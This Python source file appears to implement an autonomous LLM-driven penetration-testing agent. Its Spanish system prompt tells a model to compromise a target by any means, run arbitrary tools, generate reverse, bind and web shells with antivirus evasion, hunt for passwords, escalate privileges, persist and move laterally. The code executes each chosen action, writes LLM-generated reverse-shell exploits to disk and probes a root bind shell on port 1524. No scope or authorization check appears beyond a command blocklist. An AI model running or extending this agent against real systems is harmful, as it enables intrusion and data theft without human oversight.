import re, json, os, base64, shlex, subprocess, socket, threading, time
from pathlib import Path
from datetime import datetime
from typing import Optional

from db import add_scan_event, get_connection, update_scan_run
from llm import ask_lm_studio
from llm_config import load_llm_config, run_llm_chat
from tools import run_tool_by_command, is_blocked_command
from search import handle_search_dispatch, fetch_page
from cve_engine import auto_exploit_pipeline, generate_exploit_code, save_payload_to_db

AGENT_VERSION = "2.0"
WORKSPACE = Path(os.path.dirname(__file__)) / "generated_exploits"
WORKSPACE.mkdir(exist_ok=True)

AGENT_SYSTEM_PROMPT = """Eres Metatron Agent v{version}, un operador autónomo de pruebas de penetración.
Tu misión es comprometer el objetivo por cualquier medio técnicamente válido.

CAPACIDADES COMPLETAS:
1. EJECUCIÓN LOCAL: Ejecuta CUALQUIER comando o herramienta en el sistema local (Kali/Parrot)
   - nmap, masscan, rustscan, gobuster, ffuf, wfuzz, dirb, nikto, whatweb, curl, wget
   - searchsploit, msfconsole, sqlmap, hydra, john, hashcat, medusa, ncrack
   - smbclient, enum4linux, rpcclient, ldapsearch, snmpwalk, onesixtyone
   - python3, bash, sh, perl, ruby, php, powershell, nc, ncat, socat
   - CUALQUIER otro binario instalado en el sistema

2. EJECUCIÓN REMOTA (SESSION): Ejecuta comandos dentro de una víctima comprometida
   - Enumeración del sistema (whoami, id, uname -a, cat /etc/*release)
   - Escalación de privilegios (sudo -l, find / -perm -4000, ls -la /etc/cron*)
   - Búsqueda de datos sensibles (grep -r "password" /, find / -name "*.db", etc.)
   - Movimiento lateral y persistencia

3. INVESTIGACIÓN (SEARCH): Busca información en internet
   - CVEs, exploits, payloads, técnicas de evasión
   - Documentación técnica, configuraciones por defecto
   - Cualquier información relevante para el compromiso

4. FETCH: Obtén y analiza contenido de URLs específicas
   - PoCs, write-ups técnicos, documentación de APIs

5. GENERACIÓN DE EXPLOITS: Crea payloads y scripts de explotación
   - Cualquier lenguaje (python, bash, ruby, perl, powershell, C, etc.)
   - Reverse shells, bind shells, web shells
   - Ofuscación y evasión de AV

6. LISTENER: Inicia/kills listeners en segundo plano
   - nc -lvnp, python http.server, msfconsole handlers
   - Cualquier servicio que requieras

REGLA DORADA: NO inventes pruebas de explotación. Si un comando falla, prueba otro enfoque. Si no hay ruta de explotación, admítelo.

Formato de respuesta (siempre una sola acción):
ACTION: LOCAL|SESSION|SEARCH|FETCH|GENERATE|LISTENER_START|LISTENER_STOP|STOP
COMMAND: <comando exacto>
QUERY: <consulta de búsqueda>
URL: <URL a fetch>
PATH: <ruta relativa en generated_exploits/>
CONTENT_B64: <contenido en base64>
PAYLOAD_TYPE: <python|bash|ruby|perl|c|powershell>
REASON: <por qué elegiste esta acción>
LHOST: <tu IP si generas reverse shell>
LPORT: <puerto si generas reverse shell>
TARGET_PORT: <puerto específico del servicio>

IMPORTANTE:
- Para SESSION, solo usa comandos que funcionen en la shell de la víctima.
- No uses comandos interactivos directos (ftp, telnet, mysql sin -e, ssh sin comando).
- Usa pipes y redirecciones para hacer comandos no interactivos.
- Si encuentras una shell abierta (1524), úsala con bash -lc "printf ... | timeout ... nc".
- Prioriza siempre la obtención de una sesión/reverse shell sobre enumeración pasiva.
- Si detectas root, haz STOP inmediatamente."""

def parse_v2_action(response: str) -> dict:
    action = {"type": "STOP", "command": "", "query": "", "url": "", "path": "", "content_b64": "", "reason": "", "payload_type": "python", "lhost": "", "lport": "4444", "target_port": ""}
    patterns = {
        "type": r"^ACTION:\s*(\S+)",
        "command": r"^COMMAND:\s*(.+)$",
        "query": r"^QUERY:\s*(.+)$",
        "url": r"^URL:\s*(.+)$",
        "path": r"^PATH:\s*(.+)$",
        "content_b64": r"^CONTENT_B64:\s*([A-Za-z0-9+/=]+)\s*$",
        "reason": r"^REASON:\s*(.+)$",
        "payload_type": r"^PAYLOAD_TYPE:\s*(.+)$",
        "lhost": r"^LHOST:\s*([0-9.]+)",
        "lport": r"^LPORT:\s*(\d+)",
        "target_port": r"^TARGET_PORT:\s*(\S+)",
    }
    for key, pattern in patterns.items():
        m = re.search(pattern, response, re.IGNORECASE | re.MULTILINE)
        if m:
            val = m.group(1).strip()
            if key == "type":
                val = val.upper()
                if val not in ("LOCAL", "SESSION", "SEARCH", "FETCH", "GENERATE", "LISTENER_START", "LISTENER_STOP", "STOP"):
                    val = "STOP"
            action[key] = val
    return action

class AgentSession:
    def __init__(self, target: str, scan_id: str, lhost: str = "", lport: int = 4444):
        self.target = target
        self.scan_id = scan_id
        self.lhost = lhost or "127.0.0.1"
        self.lport = lport
        self.transcript = []
        self.msf = None
        self.msf_session_id = None
        self.bindshell_session = None
        self.step = 0
        self.max_steps = 25
        self.listeners = {}
        self.compromised = False
        self.root_access = False
        self.vulnerabilities_found = []

    def log(self, event_type, title, content, phase="agent"):
        if self.scan_id:
            add_scan_event(self.scan_id, event_type, title, content[:2000], phase)

    def run_local(self, command: str) -> str:
        if is_blocked_command(command):
            return "[!] Comando bloqueado por seguridad."
        self.log("local_command", f"Ejecutando: {command[:100]}", command, "agent")
        output = run_tool_by_command(command, scan_id=self.scan_id, target=self.target)
        self.log("local_output", f"Output ({len(output)} chars)", output[:1500], "agent")
        self.transcript.append(f"[LOCAL] {command}\n{output[:3000]}")
        return output

    def run_session(self, command: str) -> str:
        if self.bindshell_session and self.bindshell_session.is_alive():
            output = self.bindshell_session.run(command)
            if "uid=0" in output.lower() or "root" in output.lower():
                self.root_access = True
            self.log("session_command", f"Bindshell: {command[:80]}", output[:1500], "session")
            self.transcript.append(f"[SESSION:bindshell] {command}\n{output[:3000]}")
            return output
        if self.msf and self.msf_session_id:
            try:
                output = self.msf.session_interact(self.msf_session_id, command)
                if "uid=0" in output.lower() or "root" in output.lower():
                    self.root_access = True
                self.log("session_command", f"Meterpreter: {command[:80]}", output[:1500], "session")
                self.transcript.append(f"[SESSION:meterpreter/{self.msf_session_id}] {command}\n{output[:3000]}")
                return output
            except Exception as e:
                return f"[!] Error en sesión: {e}"
        return "[!] No hay sesión activa. Usa LOCAL hasta obtener una."

    def search_web(self, query: str) -> str:
        self.log("search", f"Buscando: {query[:100]}", query, "agent")
        result = handle_search_dispatch(query)
        self.transcript.append(f"[SEARCH] {query}\n{result[:3000]}")
        return result

    def fetch_url(self, url: str) -> str:
        self.log("fetch", f"Fetching: {url}", url, "agent")
        result = fetch_page(url, max_chars=8000)
        self.transcript.append(f"[FETCH] {url}\n{result[:3000]}")
        return result

    def generate_exploit(self, payload_type: str, lhost: str, lport: str, reason: str) -> str:
        prompt = f"""Genera un exploit funcional en {payload_type} para comprometer {self.target}.
Tipo: reverse shell
LHOST: {lhost or self.lhost}
LPORT: {lport or self.lport}
Contexto: {reason}

El código debe:
- Ser autónomo y ejecutable
- Conectarse a LHOST:LPORT y dar una shell interactiva
- Incluir manejo básico de errores
- Ser lo más compacto posible

Devuelve SOLO el código, sin explicaciones."""
        self.log("generate", f"Generando exploit en {payload_type}", prompt[:300], "agent")
        try:
            config = load_llm_config()
            response = run_llm_chat([
                {"role": "system", "content": "Eres un generador de exploits. Devuelve SOLO código."},
                {"role": "user", "content": prompt},
            ], config)
            code_match = re.search(r"```(?:\w+)?\s*([\s\S]*?)```", response)
            code = code_match.group(1).strip() if code_match else response.strip()
            filename = f"auto_exploit_{self.step}.{payload_type}"
            filepath = WORKSPACE / filename
            filepath.write_text(code)
            self.log("exploit_generated", f"Exploit guardado: {filename}", code[:500], "agent")
            return f"[+] Exploit generado: {filepath} ({len(code)} bytes)"
        except Exception as e:
            return f"[!] Error generando exploit: {e}"

    def start_listener(self, command: str) -> str:
        if not command:
            return "[!] LISTENER_START requiere COMMAND."
        try:
            parts = shlex.split(command)
        except ValueError as e:
            return f"[!] Error parseando comando: {e}"
        proc = subprocess.Popen(parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        key = f"listener_{len(self.listeners) + 1}"
        self.listeners[key] = {"process": proc, "command": command, "started": datetime.now().isoformat()}
        self.log("listener", f"Listener iniciado: {key}", command, "agent")
        return f"[+] Listener {key} iniciado (pid={proc.pid}): {command}"

    def stop_listeners(self, key: str = "") -> str:
        if not key:
            keys = list(self.listeners.keys())
        else:
            keys = [key]
        outputs = []
        for k in keys:
            item = self.listeners.pop(k, None)
            if not item:
                outputs.append(f"[!] Listener {k} no encontrado")
                continue
            proc = item["process"]
            proc.terminate()
            try:
                stdout, stderr = proc.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                stdout, stderr = proc.communicate(timeout=5)
            outputs.append(f"[+] {k} detenido: {item['command']}\n{stdout[:500]}\n{stderr[:500]}")
        return "\n".join(outputs)

    def handle_action(self, action: dict) -> str:
        action_type = action["type"]
        if action_type == "STOP":
            return "__STOP__"
        if action_type == "SEARCH":
            return self.search_web(action["query"])
        if action_type == "FETCH":
            return self.fetch_url(action["url"])
        if action_type == "GENERATE":
            return self.generate_exploit(action["payload_type"], action["lhost"], action["lport"], action["reason"])
        if action_type == "LISTENER_START":
            return self.start_listener(action["command"])
        if action_type == "LISTENER_STOP":
            return self.stop_listeners(action["command"])
        if action_type == "SESSION":
            return self.run_session(action["command"])
        return self.run_local(action["command"])

    def build_context(self, recon_data: str = "") -> str:
        context = [
            f"Objetivo: {self.target}",
            f"LHOST: {self.lhost}",
            f"LPORT: {self.lport}",
            f"Comprometido: {'SI' if self.compromised else 'NO'}",
            f"Root: {'SI' if self.root_access else 'NO'}",
            f"Escaneo activo: {'SI' if not self.root_access else 'COMPLETADO'}",
            "",
            "=== DATOS DE RECONOCIMIENTO ===",
            recon_data[:6000] if recon_data else "(pendiente)",
            "",
            "=== TRANSCRIPTO DE ACCIONES ===",
        ]
        context.extend(self.transcript[-15:])
        return "\n".join(context)

    def run_cycle(self, recon_data: str = "") -> dict:
        context = self.build_context(recon_data)
        prompt = AGENT_SYSTEM_PROMPT.format(version=AGENT_VERSION)
        final_response = ""
        while self.step < self.max_steps and not self.root_access:
            self.step += 1
            if self.scan_id:
                status = get_scan_run(self.scan_id)
                if status and status[2] == "paused":
                    break
            messages = [
                {"role": "system", "content": prompt},
                {"role": "user", "content": f"Paso {self.step}/{self.max_steps}\n\n{context[-8000:]}"},
            ]
            try:
                ai_response = ask_lm_studio(messages)
                action = parse_v2_action(ai_response)
                self.log("agent_step", f"Paso {self.step}: {action['type']}",
                    f"Action: {action['type']}\nCmd: {action['command']}\nReason: {action['reason']}\nRaw: {ai_response[:500]}", "agent")
                if action["type"] == "STOP":
                    self.log("agent_stop", f"Agente detenido paso {self.step}", action["reason"], "agent")
                    final_response = ai_response
                    break
                output = self.handle_action(action)
                if output == "__STOP__":
                    self.log("agent_stop", f"Agente detenido paso {self.step}", action["reason"], "agent")
                    break
                self.transcript.append(f"=== Paso {self.step}: {action['type']} ===")
                self.transcript.append(f"RAZÓN: {action['reason']}")
                self.transcript.append(f"SALIDA:\n{output[:2000]}")
                context = self.build_context(recon_data)
                final_response = ai_response
                if self.root_access:
                    self.log("root_achieved", "ROOT ALCANZADO", f"Root obtenido en paso {self.step}", "agent")
                    break
                time.sleep(0.5)
            except Exception as e:
                self.log("agent_error", f"Error en paso {self.step}", str(e), "agent")
                self.transcript.append(f"[ERROR paso {self.step}]: {e}")
        self.log("agent_done", "Ciclo del agente completado",
            f"Pasos: {self.step}, Root: {self.root_access}, Comprometido: {self.compromised}", "agent")
        return {"steps": self.step, "root": self.root_access, "compromised": self.compromised}

def run_autonomous_scan(target: str, scan_id: str, recon_data: str = "", lhost: str = "", lport: int = 4444) -> dict:
    session = AgentSession(target, scan_id, lhost, lport)
    result = session.run_cycle(recon_data)
    return result

def check_bindshell(target: str) -> Optional["PersistentBindShell"]:
    try:
        sock = socket.create_connection((target, 1524), timeout=5)
        sock.sendall(b"id\nwhoami\nexit\n")
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        sock.close()
        output = data.decode(errors="replace")
        if "uid=0" in output or "root" in output:
            from main import PersistentBindShell
            return PersistentBindShell(target)
    except Exception:
        pass
    return None
